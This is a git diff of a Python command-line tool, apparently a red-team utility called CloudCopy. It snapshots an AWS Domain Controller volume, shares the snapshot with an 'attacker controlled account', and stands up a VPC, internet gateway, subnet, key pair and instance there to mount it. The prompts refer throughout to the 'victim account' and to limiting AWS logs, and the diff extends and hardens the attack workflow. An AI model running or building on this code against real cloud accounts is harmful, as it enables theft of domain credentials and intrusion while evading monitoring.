@@ -13,7 +13,6 @@ except (ImportError, TypeError):
     import pyreadline as readline
 
 from CloudCopyUtils import CloudCopyUtils
-from botocore.exceptions import ClientError
 
 # These might change, I'll probably forget to update it
 REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
@@ -146,10 +145,11 @@ class BaseCloudCopy(BaseCmdInterpreter):
             })
             try:
                 self.cloudCopier.createBotoClient()
-                self.cloneNewInstance()
-                return True
-            except ClientError:
-                print("Error getting boto3 client to AWS")
+                return self.cloneNewInstance()
+            except Exception as e:
+                print(e)
+                print("Error creating instance or getting client")
+                self.cloudCopier.cleanup()
                 return False
         else:
             print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")
@@ -173,19 +173,24 @@ class BaseCloudCopy(BaseCmdInterpreter):
                     self.cloudCopier.printGap()
                     if self.cloudCopier.modifySnapshot():  # inflection point here that can fail if they encrypt drives
                         self.cloudCopier.printGap()
-                        if self.cloudCopier.createSecurityGroup():
+                        if self.cloudCopier.createVPC():
                             self.cloudCopier.printGap()
-                            if self.cloudCopier.createKeyPair():
+                            if self.cloudCopier.createInternetGateway():
                                 self.cloudCopier.printGap()
-                                if self.cloudCopier.createInstance():
+                                if self.cloudCopier.createSecurityGroup():
                                     self.cloudCopier.printGap()
-                            else:
-                                self.cloudCopier.cleanup()
+                                    if self.cloudCopier.createSubnet():
+                                        self.cloudCopier.printGap()
+                                        if self.cloudCopier.createKeyPair():
+                                            self.cloudCopier.printGap()
+                                            if self.cloudCopier.createInstance():
+                                                self.cloudCopier.printGap()
+                                                return True
                     else:
                         print(
-                            "The Domain Controller's volume is encrypted meaning we can't share the snapshots created from it"
-                            " with the attacker controlled account. We can possibly continue by creating the instance and "
-                            "security group on the victim account but this will create more AWS logs...")
+                            "The Domain Controller's volume is encrypted meaning we can't share the snapshots created "
+                            "from it with the attacker controlled account. We can possibly continue by creating the "
+                            "instance and security group on the victim account but this will create more AWS logs...")
                         onward = input(
                             "would you like to continue the CloudCopy attack using only the victim account? (Y/N)")
                         self.cloudCopier.printGap()
@@ -195,21 +200,31 @@ class BaseCloudCopy(BaseCmdInterpreter):
                                 "would you like to continue the CloudCopy attack using only the victim account? (Y/N)")
                         if onward in ['y', 'Y']:
                             # These will all happen under the context of the victim account, Good luck and Godspeed
-                            if self.cloudCopier.createSecurityGroup():
+                            if self.cloudCopier.createVPC():
                                 self.cloudCopier.printGap()
-                                if self.cloudCopier.createKeyPair():
+                                if self.cloudCopier.createInternetGateway():
                                     self.cloudCopier.printGap()
-                                    if self.cloudCopier.createInstance():
+                                    if self.cloudCopier.createSecurityGroup():
                                         self.cloudCopier.printGap()
+                                        if self.cloudCopier.createSubnet():
+                                            self.cloudCopier.printGap()
+                                            if self.cloudCopier.createKeyPair():
+                                                self.cloudCopier.printGap()
+                                                if self.cloudCopier.createInstance():
+                                                    self.cloudCopier.printGap()
+                                                    return True
                         else:
                             print("Sorry they encrypted their drives, better luck next time.")
                             self.cloudCopier.cleanup()
                 else:
                     print("Snapshot failed being created. This is required for the attack. ")
                     self.cloudCopier.cleanup()
+            else:
+                print("Invalid ec2 instance id. ")
         except KeyboardInterrupt:
             print("User cancelled cloudCopy, cleaning up...")
             self.cloudCopier.cleanup()
+        return False
 
 
 '''
@@ -287,4 +302,7 @@ For one attack path:
 
 if __name__ == '__main__':
     cmd = MainMenu()
-    cmd.cmdloop()
+    try:
+        cmd.cmdloop()
+    except KeyboardInterrupt:
+        print("K. BYE!")
